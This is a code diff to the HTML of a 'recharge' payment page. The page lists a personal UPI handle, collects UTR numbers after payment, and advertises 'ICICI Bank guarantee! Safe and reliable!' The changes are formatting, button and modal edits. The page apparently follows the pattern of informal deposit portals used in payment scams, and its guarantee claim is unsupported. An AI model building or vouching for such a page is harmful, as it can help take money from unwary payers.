@@ -17,9 +17,8 @@
             </tr>
             <tr>
                 <td>VPA/UPI</td>
-               <td align="right" class="upi-display">pritishdas8258-1@okaxis</td>
-<td><button class="cpb" onclick="copyUPI()">COPY</button></td>
-
+                <td align="right" class="upi-display">pritishdas8258-1@okaxis</td>
+                <td><button class="cpb" onclick="copyUPI()">COPY</button></td>
             </tr>
         </table>
         <table width="100%">
@@ -50,12 +49,12 @@
         </table>
         <br>
         <p class="a1">↓ Fill the UTR numbers after you have done the payment ↓</p><br>
-        <form method="post">
+        <form method="post" onsubmit="return false;">
             UTR 
-            <input type="text" name="utr" class="inp" placeholder="Input UTR number"><br>
+            <input type="text" name="utr" id="utrInput" class="inp" placeholder="Input UTR number"><br>
             <center>
-                <input type="button" class="btn1" value="Submit UTR" id="submitUtrButton">
-                <input type="button" class="btn2" value="Pay failed (try bank account)">
+                <button type="button" class="btn1" id="submitUtrButton">Submit UTR</button>
+                <button type="button" class="btn2">Pay failed (try bank account)</button>
             </center>
         </form><br>
         <p style="color: lightgray; font-size: 16px;">Dear customers: please give priority to this channel to recharge! Support UPI account withdrawal! ICICI Bank guarantee! Safe and reliable! If you have any questions, please contact: <br>
@@ -63,14 +62,21 @@
         </p>
     </div>
 
-    <!-- Modal -->
+    <!-- Modals -->
+    <div class="modal" id="copyModal">
+        <div class="modal-content">
+            <span class="close" onclick="closeModal('copyModal')">&times;</span>
+            <p id="copyMessage" class="modal-text"></p>
+        </div>
+    </div>
+
     <div class="modal" id="utrModal">
         <div class="modal-content">
-            <span class="close">&times;</span>
+            <span class="close" onclick="closeModal('utrModal')">&times;</span>
             <h2>Confirm UTR Submission</h2>
             <p>Are you sure you want to submit the UTR number?</p>
             <button id="confirmButton">Yes, Submit</button>
-            <button class="closeModal">Cancel</button>
+            <button class="closeModal" onclick="closeModal('utrModal')">Cancel</button>
         </div>
     </div>
 </body>
